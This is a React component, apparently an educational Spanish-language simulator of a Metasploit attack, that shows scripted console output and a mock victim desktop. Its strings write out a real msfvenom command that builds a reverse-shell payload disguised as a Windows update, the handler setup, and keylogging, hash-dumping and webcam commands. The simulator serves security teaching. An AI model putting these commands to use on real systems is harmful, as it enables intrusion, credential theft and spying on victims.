import React, { useState, useEffect, useRef } from "react";
import { Terminal, Shield, Play, Power, RefreshCw, Key, Image, Monitor, Keyboard, FileCode, Video, FolderPlus, ShieldAlert, ShieldCheck } from "lucide-react";

export default function MetasploitSimulator() {
  const [lhost, setLhost] = useState("192.168.1.15");
  const [lport, setLport] = useState("4444");
  const [step, setStep] = useState<number>(0);
  const [consoleLogs, setConsoleLogs] = useState<string[]>([]);
  const [commandInput, setCommandInput] = useState("");
  const [screenshotVisible, setScreenshotVisible] = useState(false);
  const [notification, setNotification] = useState<{ message: string; type: "success" | "info" } | null>(null);
  const [firewallActive, setFirewallActive] = useState(true);
  const [hackedFolderCreated, setHackedFolderCreated] = useState(false);
  const [webcamActive, setWebcamActive] = useState(false);

  const consoleContainerRef = useRef<HTMLDivElement | null>(null);
  const screenshotSectionRef = useRef<HTMLDivElement | null>(null);

  useEffect(() => {
    if (consoleContainerRef.current) {
      consoleContainerRef.current.scrollTop = consoleContainerRef.current.scrollHeight;
    }
  }, [consoleLogs]);

  useEffect(() => {
    if (notification) {
      const timer = setTimeout(() => {
        setNotification(null);
      }, 5000);
      return () => clearTimeout(timer);
    }
  }, [notification]);

  const startMsfvenom = () => {
    setStep(1);
    setConsoleLogs([
      `kali@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${lhost} LPORT=${lport} -f exe -o WindowsUpdate64.exe`,
      "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload",
      "[-] No arch selected, selecting arch: x64 from the payload",
      "No encoder specified, outputting raw payload",
      "Payload size: 510 bytes",
      "Final size of exe file: 7168 bytes",
      "Saved as: WindowsUpdate64.exe"
    ]);
  };

  const startHandler = () => {
    setStep(2);
    setConsoleLogs((prev) => [
      ...prev,
      "kali@kali:~$ msfconsole",
      "Metasploit tip: Export your database results with db_export -f xml <file>",
      "",
      "  __  __      _                  _       _ _   ",
      " |  \\/  | ___| |_ __ _ ___ _ __ | | ___ (_) |_ ",
      " | |\\/| |/ _ \\ __/ _` / __| '_ \\| |/ _ \\| | __|",
      " | |  | |  __/ || (_| \\__ \\ |_) | | (_) | | |_ ",
      " |_|  |_|\\___|\\__\\__,_|___/ .__/|_|\\___/|_|\\__|",
      "                          |_|                  ",
      "",
      "       =[ metasploit v6.4.135-dev                         ]",
      "+ -- --=[ 2,654 exploits - 1,338 auxiliary - 2,141 payloads ]",
      "+ -- --=[ 432 post       - 49 encoders     - 14 nops        ]",
      "",
      "Metasploit Documentation: https://docs.metasploit.com/",
      "The Metasploit Framework is a Rapid7 Open Source Project",
      "",
      "msf6 > use exploit/multi/handler",
      "msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp",
      `PAYLOAD => windows/x64/meterpreter/reverse_tcp`,
      `msf6 exploit(multi/handler) > set LHOST ${lhost}`,
      `LHOST => ${lhost}`,
      `msf6 exploit(multi/handler) > set LPORT ${lport}`,
      `LPORT => ${lport}`,
      "msf6 exploit(multi/handler) > exploit",
      `[*] Started reverse TCP handler on ${lhost}:${lport}`,
      "[*] Waiting for connection..."
    ]);
  };

  const executePayloadOnVictim = () => {
    if (step !== 2) return;
    if (firewallActive) {
      setConsoleLogs((prev) => [
        ...prev,
        "[*] Sending stage (175,174 bytes) to 192.168.1.23...",
        "[-] Exploit failed [unreachable]: Connection refused by the target machine.",
        "[!] Payload delivery blocked by endpoint security (Windows Defender/Firewall).",
        "[*] Waiting for connection..."
      ]);
      setNotification({
        message: "❌ ¡Conexión bloqueada! Windows Defender o el Firewall interceptó el Reverse Shell. Desactívalo primero en la pantalla de la víctima.",
        type: "info"
      });
      return;
    }
    setStep(3);
    setConsoleLogs((prev) => [
      ...prev,
      "[*] Sending stage (175,174 bytes) to 192.168.1.23...",
      "[*] Meterpreter session 1 opened (192.168.1.15:4444 -> 192.168.1.23:51341)",
      "",
      "meterpreter > "
    ]);
  };

  const handleMeterpreterCommand = (cmd: string) => {
    if (step !== 3) return;
    let cmdLog = `meterpreter > ${cmd}`;
    let output = "";

    switch (cmd) {
      case "sysinfo":
        output = `Computer        : MAPA
OS              : Windows 11 24H2+ (10.0 Build 26200).
Architecture    : x64
System Language : es_PE
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows`;
        setScreenshotVisible(false);
        setNotification({
          message: "💻 Comando 'sysinfo' ejecutado con éxito. Se muestran detalles del sistema operativo en msfconsole.",
          type: "success"
        });
        break;
      case "screenshot":
        output = "Screenshot saved to: /home/kali/JxDEDsEP.jpeg";
        setWebcamActive(false);
        setScreenshotVisible(true);
        setNotification({
          message: "📸 ¡Captura de pantalla tomada con éxito! Abriendo visor de imágenes de Kali Linux.",
          type: "success"
        });
        break;
      case "keyscan_start":
        output = "[*] Starting keystroke sniffer on active thread...";
        setScreenshotVisible(false);
        setNotification({
          message: "⌨️ Sniffer de teclado activado. Comenzando captura de pulsaciones en la máquina víctima.",
          type: "success"
        });
        break;
      case "keyscan_dump":
        output = `[*] Dumping captured keystrokes:
pedro.gomez [TAB] SecretPassword123! [ENTER]
https://gmail.com [ENTER]
mail_to_dean_of_faculty_draft.docx [ENTER]`;
        setScreenshotVisible(false);
        setNotification({
          message: "⌨️ Volcado de teclas finalizado. Se han extraído las credenciales y URLs capturadas.",
          type: "success"
        });
        break;
      case "hashdump":
        output = `Administrator : 500 : aad3b435b51404eeaad3b435b51404ee : 31d6cfe0d16ae931b73c59d7e0c089c0 :::
Guest         : 501 : aad3b435b51404eeaad3b435b51404ee : 31d6cfe0d16ae931b73c59d7e0c089c0 :::
PedroGomez    : 1001 : 52b8663806f391a82ee17f8a3d1db9b2 : b4511ac61f9a12c4193561a129038ba1 :::`;
        setScreenshotVisible(false);
        setNotification({
          message: "🔑 Ataque de hashdump exitoso. Base de datos SAM volcada con contraseñas en formato hash NTLM.",
          type: "success"
        });
        break;
      case "webcam_stream":
        output = `[*] Starting...
[*] Preparing player...
[*] Opening player at: /home/kali/HASFRFKK.html
[*] Streaming...
[GFX1-]: RenderCompositorSWGL failed mapping default framebuffer, no dt
^C[-] webcam_stream: Interrupted`;
        setScreenshotVisible(false);
        setWebcamActive(true);
        setNotification({
          message: "🎥 ¡Streaming de cámara web activado! Visualizando entorno de la víctima en tiempo real.",
          type: "success"
        });
        break;
      case "mkdir hacked":
        output = "Creating directory: HACKED";
        setHackedFolderCreated(true);
        setNotification({
          message: "📁 Carpeta 'HACKED' creada exitosamente en el escritorio de la víctima usando 'mkdir'.",
          type: "success"
        });
        break;
      default:
        output = `Command '${cmd}' not recognized in Meterpreter interactive shell context. Try clicking one of the rapid command keys below.`;
        setScreenshotVisible(false);
    }

    setConsoleLogs((prev) => [...prev, cmdLog, output, "meterpreter > "]);
  };

  const handleCommandSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!commandInput.trim()) return;
    handleMeterpreterCommand(commandInput.trim().toLowerCase());
    setCommandInput("");
  };

  const resetAll = () => {
    setStep(0);
    setConsoleLogs([]);
    setScreenshotVisible(false);
    setFirewallActive(true);
    setHackedFolderCreated(false);
    setWebcamActive(false);
  };

  return (
    <div id="metasploit_simulator_root" className="grid grid-cols-1 xl:grid-cols-12 gap-5 relative">
      {/* Floating status alert popup */}
      {notification && (
        <div className="fixed bottom-4 right-4 z-[9999] max-w-sm bg-slate-50 dark:bg-zinc-950/95 border border-emerald-400 dark:border-emerald-900/40 text-slate-100 rounded-xl shadow-2xl p-4 flex flex-wrap items-start gap-3 backdrop-blur-md animate-in fade-in slide-in-from-bottom-4 duration-300">
          <div className="p-1.5 bg-emerald-50 dark:bg-emerald-950/30 rounded-lg text-emerald-400 mt-0.5">
            <Shield className="h-5 w-5 animate-pulse" />
          </div>
          <div className="flex-1 space-y-1">
            <p className="text-xs font-bold text-slate-200">Notificación de msfconsole</p>
            <p className="text-[11px] text-slate-600 leading-relaxed">{notification.message}</p>
          </div>
          <button onClick={() => setNotification(null)} className="text-slate-700 hover:text-slate-300 text-sm font-semibold select-none cursor-pointer">×</button>
        </div>
      )}

      {/* Parameter Settings & Msfvenom commands builder */}
      <div className="xl:col-span-5 flex flex-col justify-between space-y-4">
        <div className="bg-white dark:bg-zinc-950 border border-slate-400 dark:border-zinc-850 rounded-xl p-5 space-y-4">
          <div>
            <h3 className="text-sm font-bold text-slate-800 dark:text-zinc-200 mb-1">MSFvenom & Payload Config</h3>
            <p className="text-xs text-slate-600">Define los parámetros del malware educativo con conexión de retorno (Reverse Connection).</p>
          </div>

          <div className="grid grid-cols-2 gap-3">
            <div>
              <label className="block text-xs font-medium text-slate-600 dark:text-zinc-400 mb-1">LHOST (IP Atacante)</label>
              <input
                type="text"
                value={lhost}
                onChange={(e) => setLhost(e.target.value)}
                disabled={step > 0}
                className="w-full text-xs px-3 py-2 border border-slate-400 dark:border-zinc-800 rounded bg-slate-50 dark:bg-zinc-900 text-slate-900 dark:text-zinc-100 font-mono"
              />
            </div>
            <div>
              <label className="block text-xs font-medium text-slate-600 dark:text-zinc-400 mb-1">LPORT (Puerto)</label>
              <input
                type="text"
                value={lport}
                onChange={(e) => setLport(e.target.value)}
                disabled={step > 0}
                className="w-full text-xs px-3 py-2 border border-slate-400 dark:border-zinc-800 rounded bg-slate-50 dark:bg-zinc-900 text-slate-900 dark:text-zinc-100 font-mono"
              />
            </div>
          </div>

          {step === 0 && (
            <button
              id="btn_build_payload"
              onClick={startMsfvenom}
              className="w-full py-2.5 px-4 bg-indigo-600 hover:bg-indigo-50 dark:bg-indigo-950/300 text-white rounded-lg text-xs font-semibold cursor-pointer transition-colors flex flex-wrap items-center justify-center gap-2"
            >
              <FileCode className="h-4 w-4" /> Compilar Payload (.exe)
            </button>
          )}

          {step === 1 && (
            <div className="p-4 bg-slate-50/50 dark:bg-slate-900/20 border border-slate-400 dark:border-slate-800 rounded-lg space-y-2.5">
              <h4 className="text-xs font-bold text-slate-800 dark:text-slate-200 flex flex-wrap items-center gap-1.5">
                <Terminal className="h-4 w-4 text-slate-700" /> Configurar Escucha (Handler)
              </h4>
              <p className="text-[11px] text-slate-700">
                El payload ha sido generado. Ahora debes abrir msfconsole y configurar el <code className="bg-slate-200 dark:bg-zinc-800 px-1 rounded">exploit/multi/handler</code> para escuchar la conexión entrante.
              </p>
              <button
                id="btn_start_handler"
                onClick={startHandler}
                className="w-full py-2 bg-slate-800 hover:bg-slate-700 text-white rounded font-semibold text-xs cursor-pointer flex flex-wrap items-center justify-center gap-1.5"
              >
                <RefreshCw className="h-3.5 w-3.5" /> Iniciar msfconsole y Escuchar
              </button>
            </div>
          )}

          {step === 2 && (
            <div className="p-4 bg-indigo-50/50 dark:bg-indigo-950/20 border border-indigo-400 dark:border-indigo-900 rounded-lg space-y-2.5">
              <h4 className="text-xs font-bold text-indigo-950 dark:text-indigo-200 flex flex-wrap items-center gap-1.5">
                <Monitor className="h-4 w-4 text-indigo-500 animate-pulse" /> Payload Ejecutable Compilado
              </h4>
              <p className="text-[11px] text-slate-700">
                El archivo ejecutable <code className="bg-slate-200 dark:bg-zinc-800 text-slate-700 dark:text-zinc-300 px-1.5 py-0.5 rounded text-[10px] font-mono border border-slate-500 dark:border-zinc-700">WindowsUpdate.exe</code> ya fue troyanizado e introducido virtualmente en el sistema de Windows 10 de la víctima. Presiona el botón aquí abajo, <strong>o haz doble clic en el archivo dentro de la pantalla de la víctima</strong> para ejecutarlo.
              </p>
              <button
                id="btn_execute_payload"
                onClick={executePayloadOnVictim}
                className="w-full py-2 bg-emerald-600 hover:bg-emerald-50 dark:bg-emerald-950/300 text-white rounded font-semibold text-xs cursor-pointer flex flex-wrap items-center justify-center gap-1.5"
              >
                <Power className="h-3.5 w-3.5" /> Simular Ejecución en Windows Víctima
              </button>
            </div>
          )}

          {step === 3 && (
            <div className="p-4 bg-emerald-50/50 dark:bg-emerald-950/20 border border-emerald-400 dark:border-emerald-900 rounded-lg space-y-3">
              <h4 className="text-xs font-bold text-emerald-950 dark:text-emerald-200 flex flex-wrap items-center gap-1.5">
                <Shield className="h-4 w-4 text-emerald-500 animate-bounce" /> ¡Sesión de Meterpreter Abierta!
              </h4>
              <p className="text-[11px] text-slate-700">
                El equipo Windows ha establecido conexión reversa. Ejecuta comandos de post-explotación interactiva mediante estos botones:
              </p>

              <div className="grid grid-cols-2 gap-2 text-[11px]">
                <button
                  id="btn_meterpreter_sysinfo"
                  onClick={() => handleMeterpreterCommand("sysinfo")}
                  className="py-1.5 px-2 border border-slate-400 dark:border-zinc-800 bg-white hover:bg-slate-50 dark:bg-zinc-900 dark:hover:bg-zinc-800 rounded flex flex-wrap items-center gap-1.5 text-slate-700 dark:text-zinc-300 font-semibold cursor-pointer"
                >
                  <Monitor className="h-3.5 w-3.5 text-blue-500" /> sysinfo (Sistema)
                </button>
                <button
                  id="btn_meterpreter_screenshot"
                  onClick={() => handleMeterpreterCommand("screenshot")}
                  className="py-1.5 px-2 border border-slate-400 dark:border-zinc-800 bg-white hover:bg-slate-50 dark:bg-zinc-900 dark:hover:bg-zinc-800 rounded flex flex-wrap items-center gap-1.5 text-slate-700 dark:text-zinc-300 font-semibold cursor-pointer"
                >
                  <Image className="h-3.5 w-3.5 text-indigo-500" /> screenshot (Foto)
                </button>
                <button
                  id="btn_meterpreter_webcam"
                  onClick={() => handleMeterpreterCommand("webcam_stream")}
                  className="py-1.5 px-2 border border-slate-400 dark:border-zinc-800 bg-white hover:bg-slate-50 dark:bg-zinc-900 dark:hover:bg-zinc-800 rounded flex flex-wrap items-center gap-1.5 text-slate-700 dark:text-zinc-300 font-semibold cursor-pointer"
                >
                  <Video className="h-3.5 w-3.5 text-pink-500" /> webcam_stream
                </button>
                <button
                  id="btn_meterpreter_mkdir"
                  onClick={() => handleMeterpreterCommand("mkdir hacked")}
                  className="py-1.5 px-2 border border-slate-400 dark:border-zinc-800 bg-white hover:bg-slate-50 dark:bg-zinc-900 dark:hover:bg-zinc-800 rounded flex flex-wrap items-center gap-1.5 text-slate-700 dark:text-zinc-300 font-semibold cursor-pointer"
                >
                  <FolderPlus className="h-3.5 w-3.5 text-cyan-500" /> mkdir HACKED
                </button>
                <button
                  id="btn_meterpreter_keyscan_start"
                  onClick={() => handleMeterpreterCommand("keyscan_start")}
                  className="py-1.5 px-2 border border-slate-400 dark:border-zinc-800 bg-white hover:bg-slate-50 dark:bg-zinc-900 dark:hover:bg-zinc-800 rounded flex flex-wrap items-center gap-1.5 text-slate-700 dark:text-zinc-300 font-semibold cursor-pointer"
                >
                  <Keyboard className="h-3.5 w-3.5 text-amber-500" /> Iniciar Sniffer Teclado
                </button>
                <button
                  id="btn_meterpreter_keyscan_dump"
                  onClick={() => handleMeterpreterCommand("keyscan_dump")}
                  className="py-1.5 px-2 border border-slate-400 dark:border-zinc-800 bg-white hover:bg-slate-50 dark:bg-zinc-900 dark:hover:bg-zinc-800 rounded flex flex-wrap items-center gap-1.5 text-slate-700 dark:text-zinc-300 font-semibold cursor-pointer"
                >
                  <Keyboard className="h-3.5 w-3.5 text-orange-500" /> Volcar Teclado
                </button>
                <button
                  id="btn_meterpreter_hashdump"
                  onClick={() => handleMeterpreterCommand("hashdump")}
                  className="py-1.5 px-2 border border-slate-400 dark:border-zinc-800 bg-white hover:bg-slate-50 dark:bg-zinc-900 dark:hover:bg-zinc-800 rounded flex flex-wrap items-center gap-1.5 text-slate-700 dark:text-zinc-300 font-semibold col-span-2 cursor-pointer"
                >
                  <Key className="h-3.5 w-3.5 text-red-500" /> hashdump (Contraseñas SAM Base de Datos)
                </button>
              </div>
            </div>
          )}
        </div>

        {step > 0 && (
          <button
            id="btn_reset_metasploit"
            onClick={resetAll}
            className="w-full flex flex-wrap items-center justify-center gap-2 py-2 px-4 bg-slate-200 hover:bg-slate-300 dark:bg-zinc-800 dark:hover:bg-zinc-700 text-slate-800 dark:text-zinc-200 rounded-lg text-xs font-semibold cursor-pointer transition-colors"
          >
            <RefreshCw className="h-3.5 w-3.5" /> Detener msfconsole y Reiniciar
          </button>
        )}

        {/* Screenshot preview panel */}
        {step > 0 && (
          <div ref={screenshotSectionRef} className="p-4 bg-slate-900 border border-slate-800 rounded-xl space-y-2 transition-all duration-500 mt-auto">
            <div className="flex justify-between items-center text-xs text-slate-600">
              <span className="flex flex-wrap items-center gap-1.5">
                <Monitor className={`h-3.5 w-3.5 ${step === 2 ? 'text-red-400' : 'text-indigo-400'}`} /> 
                Vista en Vivo: Máquina de la Víctima (MAPA)
              </span>
              <span className="font-mono text-[10px]">1366x768</span>
            </div>
            <div className="rounded-lg border h-[180px] flex flex-col justify-between overflow-hidden relative transition-all duration-1000 bg-blue-900/20 border-blue-800/40" style={{ backgroundImage: "url('https://images.unsplash.com/photo-1614624532983-4ce03382d63d?q=80&w=1000&auto=format&fit=crop')", backgroundSize: "cover", backgroundPosition: "center" }}>
              
              {/* Fake Windows 10 desktop screen */}
              <div className="flex justify-between items-start relative z-10 p-3 flex-1 overflow-hidden">
                <div className="grid grid-flow-col grid-rows-2 gap-2 text-white text-[9px] font-sans drop-shadow-md">
                  <div className="text-center w-14 cursor-default hover:bg-white/10 p-1 rounded transition-colors">
                    <div className="w-7 h-7 mx-auto bg-blue-500/80 border border-blue-400 rounded-md flex items-center justify-center text-base mb-0.5 shadow-sm">💻</div>
                    Este Equipo
                  </div>
                  <div className="text-center w-14 cursor-default hover:bg-white/10 p-1 rounded transition-colors">
                    <div className="w-7 h-7 mx-auto bg-emerald-50 dark:bg-emerald-950/30 border border-emerald-400 dark:border-emerald-900/40 rounded-md flex items-center justify-center text-base mb-0.5 shadow-sm">📁</div>
                    Notas
                  </div>
                  
                  {/* Hacked Folder created by mkdir */}
                  {hackedFolderCreated && (
                    <div className="text-center w-14 cursor-default hover:bg-white/10 p-1 rounded transition-colors animate-in zoom-in">
                      <div className="w-7 h-7 mx-auto bg-amber-50 dark:bg-amber-950/30 border border-amber-400 dark:border-amber-900/40 rounded-md flex items-center justify-center text-base mb-0.5 shadow-sm">📁</div>
                      HACKED
                    </div>
                  )}
                  
                  {/* The malicious executable */}
                  <div 
                    onClick={executePayloadOnVictim}
                    className={`text-center w-14 cursor-pointer hover:bg-white/20 p-1 rounded transition-all ${step === 2 ? 'animate-pulse scale-105' : ''}`}
                    title="¡Haz doble clic para ejecutar el malware!"
                  >
                    <div className="w-7 h-7 mx-auto bg-slate-700 border border-slate-500 rounded-md flex items-center justify-center text-base mb-0.5 shadow-md relative">
                      ⚙️
                      {step === 2 && (
                        <span className="absolute -top-1 -right-1 flex h-2.5 w-2.5">
                          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                          <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-50 dark:bg-red-950/300"></span>
                        </span>
                      )}
                    </div>
                    <span className="bg-blue-900/60 px-1 rounded truncate block">Update.exe</span>
                  </div>
                </div>

                <div className="flex flex-col items-end gap-3 z-20">
                  {/* Firewall Toggle */}
                  <button 
                    onClick={() => setFirewallActive(!firewallActive)}
                    className={`flex items-center gap-1.5 px-3 py-1.5 rounded text-[10px] font-bold shadow-lg transition-colors border ${firewallActive ? 'bg-emerald-50 dark:bg-emerald-950/30 hover:bg-emerald-600 border-emerald-400 dark:border-emerald-900/40 text-white' : 'bg-red-50 dark:bg-red-950/30 hover:bg-red-600 border-red-400 dark:border-red-900/40 text-white'}`}
                    title="Clic para simular el apagado/encendido del Firewall para el Laboratorio"
                  >
                    {firewallActive ? <ShieldCheck className="w-3.5 h-3.5" /> : <ShieldAlert className="w-3.5 h-3.5" />}
                    Defender: {firewallActive ? "ON" : "OFF"}
                  </button>
                </div>
              </div>

              {/* Windows taskbar */}
              <div className="bg-zinc-50 dark:bg-zinc-950/30 backdrop-blur-md p-2.5 px-4 border-t border-zinc-800 flex justify-between items-center text-[11px] text-zinc-300 font-sans relative z-10 shadow-[0_-5px_15px_rgba(0,0,0,0.3)] shrink-0">
                <div className="flex flex-wrap items-center gap-3">
                  <span className="text-sm text-cyan-500 hover:text-cyan-400 cursor-pointer">❖</span>
                  <div className="bg-black/50 px-3 py-1 rounded text-[10px] text-zinc-400 flex flex-wrap items-center gap-2 border border-zinc-400 dark:border-zinc-800/40">
                    🔍 Escribe aquí para buscar
                  </div>
                </div>
                <div className="flex flex-wrap items-center gap-3 text-zinc-400 text-[10px]">
                  <span className="hover:text-white cursor-pointer">^</span>
                  <span className="hover:text-white cursor-pointer">ESP</span>
                  <span className="hover:text-white cursor-pointer">13:16</span>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Terminal Display & Screenshots Grabber output */}
      <div className="xl:col-span-7 flex flex-col xl:sticky xl:top-24 xl:self-start h-[calc(100vh-8rem)] w-full space-y-4">
        {/* Metasploit console logs */}
        <div className="bg-slate-950 dark:bg-black border border-slate-800 rounded-xl overflow-hidden flex flex-col flex-1 min-h-[200px] shadow-xl">
          <div className="px-3 py-1.5 sm:px-4 sm:py-2.5 bg-slate-900 dark:bg-zinc-950 border-b border-slate-800 flex items-center justify-between">
            <div className="flex flex-wrap items-center gap-2">
              <Terminal className="h-4 w-4 text-emerald-500" />
              <span className="font-mono text-xs text-slate-300 font-semibold">msfconsole - Metasploit Framework</span>
            </div>
            <span className="text-[9px] bg-indigo-50 dark:bg-indigo-950/30 text-indigo-400 px-2 py-0.5 rounded border border-indigo-400 dark:border-indigo-900/40 font-mono">
              SESSION 1: {step === 2 ? "ACTIVE" : "NONE"}
            </span>
          </div>

          <div ref={consoleContainerRef} className="flex-1 min-h-0 p-4 font-mono text-xs text-emerald-400 overflow-y-auto space-y-1 select-text scrollbar-thin scrollbar-thumb-slate-800 scrollbar-track-transparent">
            {consoleLogs.length === 0 ? (
              <div className="h-full flex items-center justify-center text-slate-700 italic text-center py-16">
                Construye el payload para desplegar el Multi-Handler interactivo de Metasploit.
              </div>
            ) : (
              consoleLogs.map((log, i) => (
                <div key={i} className="leading-snug">
                  {log.startsWith("kali@kali") || log.startsWith("msf6") ? (
                    <span className="text-sky-400 font-semibold">{log}</span>
                  ) : log.startsWith("meterpreter >") ? (
                    <span className="text-yellow-400 font-bold">{log}</span>
                  ) : log.includes("opened") || log.includes("FOUND") ? (
                    <span className="text-green-300 font-bold">{log}</span>
                  ) : (
                    <span>{log}</span>
                  )}
                </div>
              ))
            )}
          </div>

        </div>
        {/* Kali OS - Attacker Web Browser / Image Viewer (Inline) */}
        {(screenshotVisible || webcamActive) && (
          <div className="bg-slate-100 dark:bg-zinc-900 border border-slate-500 dark:border-zinc-800 rounded-xl overflow-hidden shadow-2xl animate-in slide-in-from-bottom-4 duration-500">
            <div className="px-3 py-2 bg-slate-200 dark:bg-zinc-950 border-b border-slate-500 dark:border-zinc-800 flex items-center justify-between">
              <div className="flex flex-wrap items-center gap-2">
                <div className="flex flex-wrap gap-1.5 group cursor-pointer" onClick={() => { setScreenshotVisible(false); setWebcamActive(false); }}>
                  <div className="w-3 h-3 rounded-full bg-red-400 hover:bg-red-50 dark:bg-red-950/300 flex items-center justify-center transition-colors shadow-sm" title="Cerrar visor">
                    <span className="opacity-0 group-hover:opacity-100 text-[8px] text-red-900 font-bold">x</span>
                  </div>
                  <div className="w-3 h-3 rounded-full bg-amber-400 shadow-sm"></div>
                  <div className="w-3 h-3 rounded-full bg-green-400 shadow-sm"></div>
                </div>
                <span className="font-mono text-xs text-slate-600 dark:text-zinc-400 font-semibold ml-2 select-none">
                  {webcamActive ? "Metasploit screenshare - 192.168.1.23" : "Kali Image Viewer - screenshot_desktop.png"}
                </span>
              </div>
            </div>
            
            <div className="p-4 bg-slate-50 dark:bg-zinc-900/50 flex items-center justify-center min-h-[300px]">
              {webcamActive ? (
                <div className="flex flex-col w-full bg-white dark:bg-zinc-100 rounded overflow-hidden shadow-inner border border-slate-500 dark:border-zinc-700">
                  <div className="bg-slate-100 dark:bg-zinc-200 px-3 py-1.5 flex flex-wrap items-center gap-2 border-b border-slate-500 dark:border-zinc-400 dark:border-zinc-800/40 text-slate-600 text-xs font-sans">
                    <span className="opacity-50">←</span> <span className="opacity-50">→</span> <span className="opacity-50">↻</span>
                    <div className="flex flex-wrap-1 bg-white dark:bg-zinc-950/30 border border-slate-500 dark:border-zinc-400 dark:border-zinc-800/40 rounded px-2 py-0.5 text-[10px] font-mono truncate text-black flex items-center gap-1.5">
                      <FileCode className="h-3 w-3" /> file:///home/kali/HASFRFKK.html
                    </div>
                  </div>
                  <div className="p-3 bg-white text-black font-mono text-[10px] sm:text-xs leading-tight border-b border-slate-400 dark:border-slate-800/40">
                    <div>Target IP  : 192.168.1.23</div>
                    <div>Start time : 2026-07-12 21:25:15 -0500</div>
                    <div>Status     : Playing</div>
                  </div>
                  <div className="relative w-full aspect-video bg-zinc-900 border-t border-slate-500">
                    <img 
                      src="https://images.unsplash.com/photo-1600508774634-4e11d34730e2?q=80&w=800&auto=format&fit=crop" 
                      className="w-full h-full object-cover" 
                      alt="Webcam Feed" 
                    />
                  </div>
                </div>
              ) : (
                <div 
                  className="relative w-full aspect-video rounded-lg overflow-hidden border border-slate-500 dark:border-zinc-700 shadow-inner group flex flex-col justify-between bg-blue-900/20"
                  style={{ backgroundImage: "url('https://images.unsplash.com/photo-1614624532983-4ce03382d63d?q=80&w=1000&auto=format&fit=crop')", backgroundSize: "cover", backgroundPosition: "center" }}
                >
                  <div className="flex justify-between items-start relative z-10 p-3 flex-1">
                    <div className="flex flex-col gap-2 text-white text-[9px] font-sans drop-shadow-md">
                      <div className="text-center w-12 cursor-default p-0.5 rounded">
                        <div className="w-6 h-6 mx-auto bg-blue-500/80 border border-blue-400 rounded flex items-center justify-center text-xs mb-0.5 shadow-sm">💻</div>
                        Este Equipo
                      </div>
                      <div className="text-center w-12 cursor-default p-0.5 rounded">
                        <div className="w-6 h-6 mx-auto bg-emerald-50 dark:bg-emerald-950/30 border border-emerald-400 dark:border-emerald-900/40 rounded flex items-center justify-center text-xs mb-0.5 shadow-sm">📁</div>
                        Notas
                      </div>
                      {hackedFolderCreated && (
                        <div className="text-center w-12 cursor-default p-0.5 rounded">
                          <div className="w-6 h-6 mx-auto bg-amber-50 dark:bg-amber-950/30 border border-amber-400 dark:border-amber-900/40 rounded flex items-center justify-center text-xs mb-0.5 shadow-sm">📁</div>
                          HACKED
                        </div>
                      )}
                      <div className="text-center w-12 cursor-default p-0.5 rounded">
                        <div className="w-6 h-6 mx-auto bg-slate-700 border border-slate-500 rounded flex items-center justify-center text-xs mb-0.5 shadow-md relative">⚙️</div>
                        <span className="bg-blue-900/60 px-1 rounded">Update.exe</span>
                      </div>
                    </div>
                  </div>

                  {/* Windows taskbar clone */}
                  <div className="bg-zinc-50 dark:bg-zinc-950/30 backdrop-blur-md p-1.5 px-3 border-t border-zinc-800 flex justify-between items-center text-[8px] text-zinc-300 font-sans relative z-10 shadow-[0_-5px_15px_rgba(0,0,0,0.3)] shrink-0">
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="text-[10px] text-cyan-500">❖</span>
                      <div className="bg-black/50 px-2 py-0.5 rounded text-[8px] text-zinc-400 flex flex-wrap items-center gap-1 border border-zinc-400 dark:border-zinc-800/40">
                        🔍 Escribe aquí para buscar
                      </div>
                    </div>
                    <div className="flex flex-wrap items-center gap-2 text-zinc-400">
                      <span>^</span>
                      <span>ESP</span>
                      <span>13:16</span>
                    </div>
                  </div>

                  <div className="absolute inset-0 bg-black/40 opacity-0 group-hover:opacity-100 transition-opacity flex items-center justify-center z-10 pointer-events-none">
                    <span className="text-white font-semibold text-sm bg-black/60 px-3 py-1.5 sm:px-4 sm:py-2 rounded-lg backdrop-blur">
                      Captura de pantalla de la víctima (Simulación Local)
                    </span>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
